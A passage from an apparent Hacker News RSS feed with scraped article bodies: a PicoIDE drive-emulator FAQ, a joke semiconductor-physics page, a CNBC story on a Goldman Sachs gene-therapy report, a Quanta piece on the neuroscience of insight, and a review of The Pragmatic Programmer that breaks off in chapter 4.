                    <img src="https://picoide.com/picoide-front-quarter.jpg" alt="Front quarter view of the PicoIDE">
                </a>
                <a href="https://picoide.com/disc-selection-sm.jpg">
                    <img src="https://picoide.com/disc-selection-sm.jpg" alt="Selecting from a list of discs">
                </a>
                <a href="https://picoide.com/picoide.jpg">
                    <img src="https://picoide.com/picoide.jpg" alt="The venerable oakcdrom.sys being loaded">
                </a>
                <a href="https://picoide.com/picoide-speedsys.jpg">
                    <img src="https://picoide.com/picoide-speedsys.jpg" alt="SpeedSys benchmark of CD-ROM mode">
                </a>
            </section>

            
        </main>

        <section>
            <h2>Frequently Asked Questions</h2>
            <dl>
                <dt>Can PicoIDE emulate more than 1 drive at a time?</dt>
                <dd>Currently PicoIDE only emulates one drive, but the hardware is capable of supporting two devices simultaneously. Enabling this is a priority for development after the PicoIDE is released.</dd>

                <dt>Can you add [hardware feature]?</dt>
                <dd>The current hardware design is locked in, but who knows what the future may bring.</dd>

                <dt>Will PicoIDE work in my device?</dt>
                <dd>The primary development/testing platform for PicoIDE is 90s-era PCs, but PicoIDE has a high level of compatibility with the ATA and ATAPI standards, so there's a good chance it will work in your device. If your device is particularly finicky, that sounds like a fun development challenge!</dd>

                <dt>What about UDMA support?</dt>
                <dd>In the interest of providing a cost-effective design, PicoIDE's hardware doesn't support UDMA, but faster systems are very well served in the area of fast HDD replacements by CF, SD, and M.2 to IDE adapters, and for optical, PicoIDE's MWDMA mode 2 and PIO mode 4 support is as fast as a 52X CD-ROM drive, plenty for fast systems.</dd>

                <dt>Will there be a 5.25" or 2.5" version?</dt>
                <dd>PicoIDE will launch with a 3.5" enclosure only, but depending how things go, other form factors may be made available.</dd>

                <dt>When will PicoIDE be available?</dt>
                <dd>PicoIDE will be launching soon™. Sign up below to be notified when it becomes available for purchase.</dd>
                
                <dt>Where will I be able to purchase a PicoIDE? How much will it cost?</dt>
                <dd>Availability and pricing will be announced when PicoIDE is launched. If you're familiar with <a href="https://picog.us/">PicoGUS</a>, you know I value making attainable hardware.</dd>
            </dl>
        </section>

        <section>
            <p>
            PicoIDE will be launching soon. Sign up to be notified when that happens!
            </p>
            
        </section>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Britney Spears' Guide to Semiconductor Physics (247 pts)]]></title>
            <link>https://britneyspears.ac/lasers.htm</link>
            <guid>45949326</guid>
            <pubDate>Sun, 16 Nov 2025 23:15:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://britneyspears.ac/lasers.htm">https://britneyspears.ac/lasers.htm</a>, See on <a href="https://news.ycombinator.com/item?id=45949326">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">

		
		
		
				
			
		
		<table>
			<tbody><tr>
				<td>
					<p>
						<img src="https://britneyspears.ac/images/bs2.jpg" width="320" height="240" alt="Britney Spears with density of states formula in a bulk material">
					</p>
					<p>
						It is a little known fact, that Ms Spears is an expert in semiconductor
						physics. Not content with just singing and acting, in the following pages, she
						will guide you in the fundamentals of the vital semiconductor laser components that have made it possible to hear her super music in a digital format.
					</p>
				</td>
				<td>
					<img src="https://britneyspears.ac/images/booble.gif" alt="Google">
<!-- SiteSearch Google -->

<!-- SiteSearch Google -->
					<p><a href="https://britneyspears.ac/physics/calculator/calculator2.htm" target="_blank">Scientific Calculator</a></p>

					<p>
						<a href="http://thehungersite.com/" target="_blank" rel="nofollow">Click here</a>
						to donate food to the starving people of the world.
						<br>
						<a href="http://thehungersite.com/" rel="nofollow"><img src="https://britneyspears.ac/hunger.gif" width="122" height="60" alt="the hunger site"></a>

					</p>


				</td>
			</tr>
		</tbody></table>
		
		<table>
			<tbody><tr>
				<td>
				
							<p><a href="http://www.splung.com/" rel="nofollow">
Splung.com Physics</a> is a website for students of physics with sections on: mechanics, optics, electricity and magnetism, thermodynamics, nuclear physics and cosmology. The site also uses Flash for demonstrations. I am looking to expand this site by concentrating on the interactive components. If you are passionate about physics and would like to collaborate in this project, by writing content then please <a href="mailto:hepcj@hotmail.com">contact me</a>.</p>
				
				</td>
				<td>
		
								<a href="http://www.splung.com/" target="_blank">
									<img src="https://britneyspears.ac/images/90x30banner02.gif" alt="splung.com physics">
								</a></td>
			</tr>
			<tr colspan="2">
			<td>
			<br>
			<a href="http://www.bad-ads.co.uk/" target="_blank">Bad-Ads.co.uk</a> Hate TV adverts? Read Bad Ads
			</td>
			</tr>
		</tbody></table>
<hr></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Goldman Sachs asks in biotech Report: Is curing patients a sustainable business? (212 pts)]]></title>
            <link>https://www.cnbc.com/2018/04/11/goldman-asks-is-curing-patients-a-sustainable-business-model.html</link>
            <guid>45949247</guid>
            <pubDate>Sun, 16 Nov 2025 23:01:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnbc.com/2018/04/11/goldman-asks-is-curing-patients-a-sustainable-business-model.html">https://www.cnbc.com/2018/04/11/goldman-asks-is-curing-patients-a-sustainable-business-model.html</a>, See on <a href="https://news.ycombinator.com/item?id=45949247">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="RegularArticle-ArticleBody-5" data-module="ArticleBody" data-test="articleBody-2" data-analytics="RegularArticle-articleBody-5-2"><div id="ArticleBody-InlineImage-104324084" data-test="InlineImage"><p>Yuri Arcurs | Getty Images</p></div><div><p>Goldman Sachs analysts attempted to address a touchy subject for biotech companies, especially those involved in the pioneering "gene therapy" treatment: cures could be bad for business in the long run. </p><p>"Is curing patients a sustainable business model?" analysts ask in an April 10 report entitled "The Genome Revolution."</p><p>"The potential to deliver 'one shot cures' is one of the most attractive aspects of gene therapy, genetically-engineered cell therapy and gene editing. However, such treatments offer a very different outlook with regard to recurring revenue versus chronic therapies," analyst Salveen Richter wrote in the note to clients Tuesday. "While this proposition carries tremendous value for patients and society, it could represent a challenge for genome medicine developers looking for sustained cash flow."</p></div><div id="Placeholder-ArticleBody-Video-105119182" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000012181" aria-labelledby="Placeholder-ArticleBody-Video-105119182"><p><img src="https://image.cnbcfm.com/api/v1/image/105119335-2ED1-PL-MegT-040918.jpg?v=1529477963&amp;w=750&amp;h=422&amp;vtcrop=y" alt="Biotech shares soar on dealmaking, drug progress"><span></span><span></span></p></div><div><p>Richter cited <span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-1"><a href="https://www.cnbc.com/quotes/GILD/">Gilead Sciences'</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> treatments for hepatitis C, which achieved cure rates of more than 90 percent. The company's U.S. sales for these hepatitis C treatments peaked at $12.5 billion in 2015, but have been falling ever since. Goldman estimates the U.S. sales for these treatments will be less than $4 billion this year, according to a table in the report.</p><p>"GILD is a case in point, where the success of its hepatitis C franchise has gradually exhausted the available pool of treatable patients," the analyst wrote. "In the case of infectious diseases such as hepatitis C, curing existing patients also decreases the number of carriers able to transmit the virus to new patients, thus the incident pool also declines … Where an incident pool remains stable (eg, in cancer) the potential for a cure poses less risk to the sustainability of a franchise."</p><p>The analyst didn't immediately respond to a request for comment.</p><p>The report suggested three potential solutions for biotech firms:</p><div><p>"Solution 1: Address large markets: Hemophilia is a $9-10bn WW market (hemophilia A, B), growing at ~6-7% annually."</p><p> "Solution 2: Address disorders with high incidence: Spinal muscular atrophy (SMA) affects the cells (neurons) in the spinal cord, impacting the ability to walk, eat, or breathe."</p><p> "Solution 3: Constant innovation and portfolio expansion: There are hundreds of inherited retinal diseases (genetics forms of blindness) … Pace of innovation will also play a role as future programs can offset the declining revenue trajectory of prior assets."</p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Neuroscientists track the neural activity underlying an “aha” (119 pts)]]></title>
            <link>https://www.quantamagazine.org/how-your-brain-creates-aha-moments-and-why-they-stick-20251105/</link>
            <guid>45948792</guid>
            <pubDate>Sun, 16 Nov 2025 21:57:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.quantamagazine.org/how-your-brain-creates-aha-moments-and-why-they-stick-20251105/">https://www.quantamagazine.org/how-your-brain-creates-aha-moments-and-why-they-stick-20251105/</a>, See on <a href="https://news.ycombinator.com/item?id=45948792">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <p>
            A sudden flash of insight is a product of your brain. Neuroscientists track the neural activity underlying an “aha” and how it might boost memory.        </p>
        
    </div><div>
            <h2>Introduction</h2>
            <div data-role="selectable">
    <p>Here are three words: pine, crab, sauce. There’s a fourth word that combines with each of the others to create another common word. What is it?</p>
<p>When <a href="#answer">the answer</a> finally comes to you, it’ll likely feel instantaneous. You might even say “Aha!” This kind of sudden realization is known as insight, and a research team recently uncovered <a href="https://doi.org/10.1038/s41467-025-59355-4">how the brain produces it</a>, which suggests why insightful ideas tend to stick in our memory.</p>
<p><a href="https://mnemology.org/team/maxi-becker/">Maxi Becker</a>, a cognitive neuroscientist at Duke University, first got interested in insight after reading the landmark 1962 book <a href="https://press.uchicago.edu/ucp/books/book/chicago/S/bo13179781.html"><em>The Structure of Scientific Revolutions</em></a> by the historian and philosopher of science Thomas Kuhn. “He describes how some ideas are so powerful that they can completely shift the way an entire field thinks,” she said. “That got me wondering: How does the brain come up with those kinds of ideas? How can a single thought change how we see the world?”</p>
<p>Such moments of insight are written across history. According to the Roman architect and engineer Vitruvius, in the third century BCE the Greek mathematician Archimedes suddenly exclaimed “Eureka!” after he slid into a bathtub and saw the water level rise by an amount equal to his submerged volume (although this tale <a href="https://www.scientificamerican.com/article/fact-or-fiction-archimede/">may be apocryphal</a>). In the 17th century, according to lore, Sir Isaac Newton had a breakthrough in understanding gravity after an apple fell on his head. In the early 1900s, Einstein came to a sudden realization that “if a man falls freely, he would not feel his weight,” which led him to his theory of relativity, as he later described in a lecture.</p>
<p>Insights are not limited to geniuses: We have these cognitive experiences all the time when solving riddles or dealing with social or intellectual problems. They are distinct from analytical problem-solving, such as the process of doing formulaic algebra, in which you arrive at a solution slowly and gradually as if you’re getting warmer. Instead, insights often follow periods of confusion. You never feel as if you’re getting warmer; rather, you go from cold to hot, seemingly in an instant. Or, as the neuropsychologist Donald Hebb, known for his work building neurobiological models of learning, wrote in the 1940s, sometimes “learning occurs as a single jump, an all-or-none affair.”</p>
</div>
    </div><div data-role="selectable">
    <p>An abrupt cognitive shift in how the mind understands information is known as a representational change. Although researchers have inferred sudden shifts in understanding from the behavior of subjects, they have not pinned down how the brain supports representational change.</p>
<p>During moments of insight, representational change typically occurs, said <a href="https://drexel.edu/coas/faculty-research/faculty-directory/psychology/Kounios-John/">John Kounios</a>, a cognitive neuroscientist at Drexel University and co-author of the book <em>The Eureka Factor: Aha Moments, Creative Insight, and the Brain</em>. “The question is: How is it occurring?”</p>
<h2><strong>Insightful Activity</strong></h2>
<p>While at Humboldt University of Berlin, Becker set out to uncover this neural signature of insight. Given that it’s nearly impossible to fabricate life-changing, field-altering insights in the lab, her team needed to identify a simple task that could produce a sudden feeling of understanding rather than a slowly unfolding solution.</p>
<p>They turned to abstracted black-and-white pictures called Mooney images, which are made by cranking up the contrast on a photograph all the way so that the subjects — a dog or a coffee mug, for example — are unrecognizable at first. The pictures pose a challenge for human brains, which typically identify objects by piecing together their different parts. But if given enough time with a Mooney image, even a few seconds, the brain can rearrange the contours to recognize the pictured object — and trigger the insightful “aha” feeling, a representational change.</p>
</div><div data-role="selectable">
    <p>Over the course of two days, Becker had study participants lie in a functional magnetic resonance imaging (fMRI) scanner, which detects blood flow in the brain as a proxy for neural activity, and view a series of 120 Mooney images. After 10 seconds of viewing a single image, the participant would indicate whether they recognized the pictured object. If they did, they would then answer a series of questions about the suddenness, positive emotion and certainty associated with their experience — three measures that have been linked to moments of insight.</p>
<p>Becker and her team then used neural networks to parse the fMRI data, looking to identify consistent changes in brain activity shared by participants when they correctly recognized Mooney images. They observed that when a participant noticed a hidden object, brain activity increased in the ventral occipitotemporal cortex (VOTC), a region responsible for recognizing visual patterns in the environment; the amygdala, which processes both positive and negative emotions; and the hippocampus, a deep-brain structure involved in handling memories. This activity was greater for experiences rated more certain and emotionally positive — in other words, more insightful ones.</p>
<p>The hippocampus is sometimes known as the brain’s “mismatch detector,” Becker said, because it reacts when an input doesn’t align with expectations. In this case, insight leads a once-meaningless image to gain meaning, going against the brain’s predictions.</p>
<figure>
    <p><img width="1500" height="1813" src="https://www.quantamagazine.org/wp-content/uploads/2025/11/Maxi-Becker-cr-Courtesy-of-Maxi-Becker.webp" alt="A portrait of Maxi Becker" decoding="async" srcset="https://www.quantamagazine.org/wp-content/uploads/2025/11/Maxi-Becker-cr-Courtesy-of-Maxi-Becker.webp 1500w, https://www.quantamagazine.org/wp-content/uploads/2025/11/Maxi-Becker-cr-Courtesy-of-Maxi-Becker-1423x1720.webp 1423w, https://www.quantamagazine.org/wp-content/uploads/2025/11/Maxi-Becker-cr-Courtesy-of-Maxi-Becker-430x520.webp 430w, https://www.quantamagazine.org/wp-content/uploads/2025/11/Maxi-Becker-cr-Courtesy-of-Maxi-Becker-768x928.webp 768w, https://www.quantamagazine.org/wp-content/uploads/2025/11/Maxi-Becker-cr-Courtesy-of-Maxi-Becker-1271x1536.webp 1271w, https://www.quantamagazine.org/wp-content/uploads/2025/11/Maxi-Becker-cr-Courtesy-of-Maxi-Becker-98x118.webp 98w" sizes="(max-width: 1500px) 100vw, 1500px">    </p>
            <figcaption>
                            <p>Maxi Becker, a cognitive neuroscientist at Duke University, explores what insight looks like in the brain.</p>
            <p>Courtesy of Maxi Becker</p>
        </figcaption>
    </figure>

<p>These regions — the hippocampus, amygdala and VOTC — create “a plausible network of brain areas” behind representational change, said Kounios, who was not involved in the study. These findings finally “connect the psychological theory with the neural mechanism,” said <a href="https://sites.northwestern.edu/markbeemanlab/team/yuhua-yu/">Yuhua Yu</a>, a postdoctoral researcher in neuroscience at the University of Arizona, who was also not involved with the study.</p>
<p>Becker and her team likely found representational change in the VOTC because of the visual nature of their stimuli. If they had chosen another type of stimulus, like words, the change would probably have appeared in language-processing areas of the brain.</p>
<p>Once the team had figured out which brain areas support insight, they wanted to probe whether these regions might be working together to create a lasting memory.</p>
<h2><strong>A Memory Boost</strong></h2>
<p>Since they began investigating insight, researchers have suspected that such experiences might boost memory. In his 1949 book <em>The Organization of Behavior</em>, Hebb <a href="https://pure.mpg.de/pubman/item/item_2346268_3/component/file_2346267/Hebb_1949_The_Organization_of_Behavior.pdf">wrote</a> that “whatever insight is, we now know that it continually affects the learning of the adult mammal.” Insight not only feels notable or salient in the moment but also helps us retain new information as memory.</p>
<p>This memory boost, which became known as the insight-memory advantage, has since been studied in many types of problem-solving, including the unraveling of <a href="https://doi.org/10.1016/j.cognition.2020.104411">magic tricks</a> and <a href="https://doi.org/10.1016/j.tics.2025.01.001">puzzles</a>. “When you have an insight, you tend to be better able to remember the solution,” Becker said, compared to when you resolve a problem more gradually. She wanted to understand why.</p>
</div><div data-role="selectable">
    <p>A few days after the initial experiment, the team tested participants’ memory by having them look at more Mooney images online, including some they had seen before. Participants were better able to remember prior images that they had rated highly on the three aspects of insight. This suggested that the insight-memory advantage was real, but the team wanted to see what was going on under the hood. Did brain activity during insight predict better memory five days later?</p>
<p>The researchers found that the larger the activity boost in both the VOTC and the hippocampus during the initial insight, the better participants remembered the Mooney images. The big change in brain activity likely makes the experience more salient, Becker said, and salient experiences are known to better encode long-term memories.</p>
<p>While insight creates stronger memories of an idea, it doesn’t mean the idea is correct. Previous work has shown that the quicker, more certain and more pleasurable a solution feels, the more likely it is to be correct — but false insights <a href="https://doi.org/10.3389/fpsyg.2016.02077">can and do exist</a>. In Becker’s study, participants wrongly identified the subjects of more than half the Mooney images they saw. Of those incorrect trials (which the researchers excluded from the analysis), the participants reported experiencing insight 40% of the time. In comparison, correct trials were accompanied by feelings of insight 65% of the time.</p>
<p>These kinds of studies of insight in the lab will set researchers up to look at how it functions in the real world. Once we decompose insight into “very simple tasks that we already understand well,” Becker said, we can “move on to more complex, truly creative tasks.”</p>
<h2><strong>Insight Into the Future</strong></h2>

<p>As a self-described uncreative person, Yu has been particularly fascinated by insight’s role in the creative process. Creativity is “like a magic power,” she said. “A really big creative idea is [often] associated with insight because a creative idea is in some way a leap in your cognitive world, and a leap will often elicit an insight or ‘aha’ feeling.”</p>
<p>However, Yu is finding that insight’s role in creativity might depend on the kind of problem a person is solving. In a recent study, she asked participants to come up with metaphors for scientific concepts and asked whether they used insight as they did so. The insight-driven metaphors <a href="https://doi.org/10.1111/cogs.13488">weren’t more or less creative</a> than those created through analytic thinking, she found — and the participants were more likely to remember the science concepts behind the latter.</p>
<p>This may be because, unlike the task of seeing a hidden object in a Mooney image, creating a metaphor tends to rely on slower cognitive problem-solving rather than sudden moments of insight, Becker suggested. The effects of insight therefore likely depend on the context.</p>
<p>Next, Yu wants to investigate insight in more contexts. “Most of the insight research is looking at insight in the problem-solving context and in the lab setting,” Yu said. She hopes that researchers will begin investigating “insight within many other domains, like in psychotherapy, in meditation, even in psychedelic experiences.”</p>
        
        
<p>Beyond offering a better understanding of how the human brain learns, these findings could have applications in classrooms. Kounios believes that applying insight-boosting strategies to teaching could lead to better learning outcomes for students. Insight seems to be a powerful and positive experience that generates accurate solutions, confidence in our answers and strong memories.</p>
<p>“It’s very intensive for a teacher to do this, but a lot of really good teachers try to get the students to have the insights themselves about how something works, and that will burn it into their memories,” Kounios said. “Another aspect of that [is], it’s very motivating, too.”</p>
<p><a id="answer"></a>It’s a nice feeling when your brain suddenly comes up with an answer. Perhaps you’ve even experienced that feeling since reading this piece’s first sentence. Maybe it even hit you like an<strong><em> apple</em></strong> on the head.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Peter Thiel sells off all Nvidia stock, stirring bubble fears (194 pts)]]></title>
            <link>https://www.thestreet.com/investing/peter-thiel-dumps-top-ai-stock-stirring-bubble-fears</link>
            <guid>45948477</guid>
            <pubDate>Sun, 16 Nov 2025 21:19:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.thestreet.com/investing/peter-thiel-dumps-top-ai-stock-stirring-bubble-fears">https://www.thestreet.com/investing/peter-thiel-dumps-top-ai-stock-stirring-bubble-fears</a>, See on <a href="https://news.ycombinator.com/item?id=45948477">Hacker News</a></p>
Couldn't get https://www.thestreet.com/investing/peter-thiel-dumps-top-ai-stock-stirring-bubble-fears: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[The Pragmatic Programmer: 20th Anniversary Edition (2023) (159 pts)]]></title>
            <link>https://www.ahalbert.com/technology/2023/12/19/the_pragmatic_programmer.html</link>
            <guid>45948254</guid>
            <pubDate>Sun, 16 Nov 2025 20:46:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ahalbert.com/technology/2023/12/19/the_pragmatic_programmer.html">https://www.ahalbert.com/technology/2023/12/19/the_pragmatic_programmer.html</a>, See on <a href="https://news.ycombinator.com/item?id=45948254">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> 
    <p>
    
    
    <img src="https://www.ahalbert.com/assets/tpp20.jpg"></p><hr>
    
    
    

    <p><a href="https://pragprog.com/titles/tpp20/the-pragmatic-programmer-20th-anniversary-edition/"><em>The Pragmatic Programmer: From Journeyman to Master</em></a> by Dave Thomas and Andrew Hunt was given to me as a gift after an internship. The book gave me invaluable advice as I started out in my career as a professional software engineer. Re-reading it a decade later, I thought the general advice still held up well, but it made references to technologies such as CORBA that are no longer used and felt dated as a result. The authors agreed and wrote a 20th anniversary edition that was updated for modern developers. A third of the book is brand-new material, covering subjects such as security and concurrency. The rest of the book has been extensively rewritten based on the authors’ experience putting these principles into practice. We discussed the 20th anniversary edition in my book club at work.&nbsp;</p>

<p>The book is meant for those just starting out in the world of professional software engineering. Many of the tips, such as <strong>Tip 28: Always Use Version Control</strong> will seem obvious to experienced hands. However, it can also be a guide for senior developers mentoring junior developers, putting actionable advice into words. The book is also valuable to those who lack a formal CS education; it explains things like big-O notation and where to learn more about these subjects. I think that any software engineer will get one or two things out of this book, though it’s most valuable for beginners.</p>

<p>One of the things I appreciate about the book is that they talk about applying the principles not only to software engineering but to writing the book as well. The book was originally written in troff and later converted to LaTeX. For example, to illustrate <strong>Tip 29: Write Code That Writes Code</strong> they wrote a program to convert troff markup to LaTeX. In the 20th anniversary edition, they talk about their efforts to use parallelism to speed up the book build process and how it led to surprising bugs.</p>

<p>Perhaps the best thing about the book is that the authors summarize their points into short tips highlighted throughout the book. The authors helpfully attach these tips to a card attached to the physical book. This makes it easy to remember the principles espoused in the book and to refer to them later. I think this is a feature that more books should include, especially managerial or technical books.</p>

<h2 id="chapter-1-a-pragmatic-philosophy">Chapter 1: A Pragmatic Philosophy</h2>

<p>The first chapter is less about coding and more about the general principles a pragmatic programmer follows. Most of all, it’s about taking responsibility for your work. The first tip of the chapter is <strong>Tip 3: You Have Agency</strong>: if you don’t like something, you can be a catalyst for change. Or you can change organizations if change isn’t happening. The most important tip of the chapter to me is <strong>Tip 4: Provide Options, Don’t Make Lame Excuses</strong>. In this section, they discuss taking responsibility for the commitments you make and having a contingency plan for things outside your control. If you don’t meet the commitment, provide solutions to fix the problems. Don’t tell your boss, “The cat ate my source code.”</p>

<p>Software rots over time without efforts to fix it. The authors talk about broken windows policing, the theory that minor problems such as a single broken window give people the psychological safety to commit larger crimes. Regardless of whether broken windows policing is actually true, the metaphor applies to software. This leads to <strong>Tip 5: Don’t Live with Broken Windows</strong>: If you see a broken window in your software, make an effort to fix it, even if it’s only a minor effort to board it up. This may seem impractical if your project already has a lot of broken windows, but this tip helps you avoid creating such an environment in the first place. In my experience, it works: when we set up a new project at work, we made a commitment to use git commit hooks to enforce coding standards. This made each of us more reluctant to compromise on software to begin with, and all of the code was a good example to copy from.</p>

<p>A pragmatic programmer is always learning, and learns things outside their specialty; they are a jack of all trades. Even if they are a specialist in their current role, they invest regularly in a broad knowledge portfolio. In addition to software skills, people skills are important as well. The section “Communicate!” shows how to effectively communicate your ideas, such as how to present, what to say, and how pick the right time. In the words of <strong>Tip 11: English is Just Another Programming Language</strong>. If you don’t have an answer to an email immediately, respond with an acknowledgment and that you’ll get back to them later - nobody wants to be talking to a void. Don’t be afraid to reach out for help if you need it; that’s what your colleagues are there for, after all. And don’t neglect documentation! Make it an integral part of the development process, not an afterthought.</p>

<p>Finally, the principles in this book are not iron-clad: you must consider the tradeoffs between different values and make the right decision for your project. Your software does not need to be perfect. When working on software, involve your users in deciding what quality issues are acceptable in return for getting it out faster. After all, if you wait a year to ship the perfect version, their requirements will change anyways. As <strong>Tip 8 says: Make Quality a Requirements Issue</strong>.</p>

<h2 id="chapter-2-a-pragmatic-approach">Chapter 2: A Pragmatic Approach</h2>

<blockquote>
  <p>Why is decoupling good? Because by isolating concerns we make each easier to change. ETC.<br>
Why is the single responsibility principle useful? Because a change in requirements is mirrored by a change in just one module. ETC.<br>
Why is naming important? Because good names make code easier to read, and you have to read it to change it. ETC! <br></p>
</blockquote>

<p>However, the authors also stress that ETC is a <em>value</em>, not a <em>rule</em>. For example, ETC may not be appropriate for writing code that has high performance requirements; making the code complex to achieve the performance requirements is an acceptable tradeoff.&nbsp;</p>

<p>They then turn to another important acronym for implementing ETC in <strong>Tip 15: DRY—Don’t Repeat Yourself</strong>. DRY makes things easier to change by having one place to change anything. Worse, if you forget to make a change, you’ll have contradictory information in your program that could crash it or silently corrupt data.</p>

<h3 id="what-kind-of-duplication-is-there">What kind of duplication is there?</h3>

<ul>
  <li><strong>Code Duplication</strong>: For example, having a case statement duplicated across several different places rather than in a single function.</li>
  <li><strong>Documentation Duplication</strong>: Some people believe that every function needs a comment. If you do this, you will also have to update the comments each time the function changes. Ask what your comment adds to the code before writing it!</li>
  <li><strong>Data Duplication</strong>: Caching an expensive result and forgetting to update the cache when the source data changes.</li>
  <li><strong>Representational Duplication</strong>: When you work with external API, the client and server must adhere to the same format in order to work. If one changes, the other side will break Having a common specification, such as openAPI allows you to integrate more reliably with the service.</li>
  <li><strong>Interdeveloper duplication</strong>: When two developers do the same work. This can be mitigated by <strong>Tip 16: Make It Easy to Reuse</strong>. If it’s hard to use your code, other developers will be tempted to duplicate it.</li>
</ul>

<p>A closely related principle to DRY is <em>Orthogonality</em>. Two components of a software system are orthogonal if changes in one do not effect the other. Systems should be designed as a set of cooperating independent modules, each of which has a single, well-defined purpose. Modules communicate between themselves using well defined interfaces and don’t rely on shared global data or the implementation details of another module. Unless you change a component’s external interfaces, it should not cause changes in the rest of the system. Orthogonal systems are easier to test, because more testing can be done at the module level in unit tests rather than end-to-end integration tests that test the whole system.</p>

<p>Often, when starting a software project, there are a lot of unknowns. The user has an idea of what they want, but there’s some ambiguity in the requirements. You don’t know if the library and frameworks you pick will work nicely together. The solution here is <strong>Tip 20: Use Tracer Bullets to Find the Target</strong>. In a machine gun, tracer bullets are bullets that glow in the air, enabling the user to see if they’re hitting the target at night. Tracer Bullet Development provides that kind of immediate feedback. Look for a single feature that can be built quickly using the architectural approach you’ve chosen, and put that in front of the users. You may miss; users may say that’s not quite what they wanted. But that’s the point of tracer code: it allows you to adjust your aim with a skeleton project that’s easier to change than a final application. Users will be delighted to see something working early, and you’ll have an integration platform to build the rest of the application on.</p>

<p>Tracer code is different from prototypes. To the authors, prototypes are disposable code used to learn about a problem domain, never meant to be used in production. Prototypes don’t even have to be code. A UI can be mocked up in an interface builder, or an architecture mapped out with post-it notes. In terms of <strong>Tip 21: Prototype to Learn</strong>. In contrast, tracer bullet code is meant to be part of the final application.</p>

<p>The final tip of this chapter I bring up is <strong>Tip 18: There Are No Final Decisions</strong>. Decisions should be reversible; if you rely on MySQL today, you may find yourself needing to switch to Postgres six months from now. If you’ve properly abstracted the database logic, making this change should be easy. Marketing may decide that your web app should be a mobile app in the future; if your architecture is built well, this extra demand should not be a burden. This is one tip I disagree with: I think it can easily be taken too far. If you provide too much reversibility, you’ll end up with over-abstracted code with configuration options that are never used. I think it’s more reasonable to think about what decisions can reasonably change and make them flexible; if you spend all your time trying to cover for every possibility, you’ll never get around to actually coding the required functionality.</p>



<p>This chapter focuses on how to make the most out of your tools, what tools to invest in, and how to approach debugging. The first bit of advice: <strong>Tip 25: Keep Knowledge in Plain Text</strong>. By plain text, they mean keep knowledge such as configuration or data in a simultaneously human-readable and computer readable format. Plain text insures you against obsolesce; you can always write something to parse it later, while reverse-engineering a binary format is significantly harder. In addition, almost any other tool in existence can process plain text in some way, so you’ll have an extensive suite of other tools to use. As an extension of the power of plain text, they also suggest you master a command shell such as <code>bash</code>. Shells provide a family of tools that are composable with each other, and can be combined as much as your imagination allows. A GUI in contrast, limits you to the actions the programmers of the GUI thought of in advance. Finally, you should learn a text processing language such as <code>awk</code> or <code>perl</code> to get the most out of text - the authors used perl (first edition) and ruby (20th anniversary edition) to automatically highlight the source code in the book, for example.</p>

<p>The next topic the authors turn to is debugging. Debugging is the main task a software engineer does throughout their day, so it’s essential you get good at it. Defects show up in a variety of ways, from misunderstood requirements to coding errors. Some cultures try to find someone to blame for a defect; the authors think you should avoid that with <strong>Tip 29: Fix the Problem, Not the Blame</strong>.</p>

<p>They give the following tips on debugging your code:</p>

<ul>
  <li><strong>Tip 30: Don’t Panic</strong>: It’s easy to panic when you’re on a tight deadline or a client is angry at you. However, take a deep breath and think about the problem at hand. The cause of the bug may be several layers removed from what you’re seeing, so try to focus on root causes rather than fixing the symptoms.</li>
  <li><strong>The Impossible has Happened</strong>: If you think to yourself “that’s not possible” - you’re wrong. It’s clearly possible, and it’s staring you in the face.</li>
  <li><strong>Reproduce It!</strong>: Find a minimal case that triggers the bug, whether that be a certain input data set, or pattern of actions. Once you can reliably cause the bug, you can trace it through your code.</li>
  <li><strong>Tip 32: Read the Damn Error Message</strong>: Enough said.</li>
  <li><strong>The Operating System is Fine</strong>: It’s <em>possible</em> that you found a bug in the Linux kernel or postgres, but these are extensively battle-tested applications. It’s much more likely that the problem is in your code.</li>
  <li><strong>The Binary Chop</strong>: Cut things in half until you find the problem. This massively decreases the search space you have to work in. If you have a long stack trace and are trying to find which function mangled the value, log the value halfway through. If the value is fine, log the value halfway through the next half, or if it’s mangled, halfway through the previous half, and so on. If a release introduces a regression, find a version that’s fine, and binary chop through the commits to find the commit that introduced the bug.</li>
  <li><strong>Use a Debugger and/or Logging Statements</strong>: Debuggers allow you to step through the code and inspect the values of variables, finding the exact point where things go wrong. In environments where a debugger is not available, logging statements can show you how a variable changes in time, or just how far the program got before crashing.</li>
  <li><strong>Rubber Ducking</strong>: Explain the bug to a colleague, or talk out loud to a rubber duck. You don’t have to get a response, by verbalizing your assumptions you may gain sudden insight into the problem.</li>
</ul>

<p>Once you’ve solved the bug, however there’s still one more step: you should write a test to catch that bug in the future.</p>

<h2 id="chapter-4-pragmatic-paranoia">Chapter 4: Pragmatic Paranoia</h2>

<p><strong>Tip 36: You Can’t Write Perfect Software</strong> starts off the chapter. While we’d like to write perfect software, there will always be bugs, poor design decisions, and missing documentation. The theme of this chapter is how to design this fact in mind.</p>

<p>The first idea they propose is <em>Design By Contract</em>. Similar to legal contracts, it explains a function or module’s rights and responsibilities. A contract has three parts: It has <em>Preconditions</em>: things that must be true when it is called, such as what qualifies as valid inputs. <em>Postconditions</em> are what will be true when it is done, such as a sort routine returning a sorted array. Finally, <em>Invariants</em> are things that are always true from the caller’s perspective - they may change while the routine is running, but will hold at the beginning and the end of the call. For example, in a sort routine, the invariant is that the list to be sorted will contain the same number of items when it started as when it finished. If the contract is violated, the contract will specify what to do, such as crash or throw an exception.</p>

